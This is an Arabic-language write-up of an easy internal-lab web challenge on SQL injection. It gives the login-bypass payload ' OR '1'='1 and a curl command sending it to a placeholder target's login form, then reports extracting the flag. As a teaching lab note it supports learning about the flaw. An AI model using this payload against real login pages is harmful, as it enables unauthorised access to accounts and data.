# SQL Injection بسيط - مثال
- القسم: Web
- اسم المُلخّص: Sara
- التاريخ: 2026-08-16
- مصدر التحدي: مختبر داخلي
- الصعوبة: Easy
- الوسوم: web, sql-injection

ملخص سريع
- الهدف استغلال إدخال غير مصفّى للحصول على بيانات من قاعدة البيانات.

النهج والخطوات
1. فحص الحقول المدخلة ورؤية استجابة السيرفر للـ `' OR '1'='1`.
2. استخدام Burp أو curl لتجربة payloads.

أوامر
```bash
# مثال بسيط باستخدام curl
curl -s -G "http://target/login" --data-urlencode "user=' OR '1'='1" --data-urlencode "pass=anything"
```

الحل النهائي
- تم استخراج محتوى الحقل الذي يحتوي على flag أو الوصول لحساب مستخدم.

ملاحظات
- هذا مثال تعليمي؛ لا تستخدم هذه الطرق على أنظمة غير مخولة.
